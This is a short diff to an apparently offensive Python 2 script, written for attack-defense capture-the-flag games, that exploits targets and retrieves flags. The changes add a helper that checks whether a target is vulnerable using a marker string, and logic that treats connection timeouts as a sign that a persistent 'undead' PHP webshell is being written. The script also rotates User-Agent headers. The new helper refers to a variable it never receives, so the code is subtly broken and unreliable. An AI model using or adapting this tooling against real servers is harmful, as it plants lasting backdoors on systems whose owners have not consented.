@@ -11,6 +11,14 @@ import sys
 import time
 from optparse import OptionParser
 
+def test_attack(target,target_port):
+    try:
+	if 'hell0W0r1d' in vulnerable_attack(target,target_port,test_vul(target,target_port,cmd)):
+	    return True
+    except Exception,e:
+	pass
+    return False
+	    
 
 def attack(target,target_port,cmd,get_flag):
     global headers,targets_status
@@ -25,8 +33,11 @@ def attack(target,target_port,cmd,get_flag):
 	headers['User-Agent'] = random_ua()    
     is_shell = check_shell(target,target_port,"")
     if is_shell=='timeout':
-	if '.php' in cmd and shell_type==2:
-	    dump_info("Writting undead php webshell")
+	shell_name,shell_arg = shell_hash(target,target_port)
+	# Sometime the timeout is result from we are generating an undead webshell
+	if shell_name in cmd and shell_type==2 and test_attack(target,target_port):
+	    dump_warning("Writting undead php webshell")
+	    res = "timeout due to write undead webshell"
 	else:
 	    dump_error("connect timeout",target+":"+str(target_port),"function.py check_shell")
 	    write_specific_log(target,target_port,"[-] connect timeout")
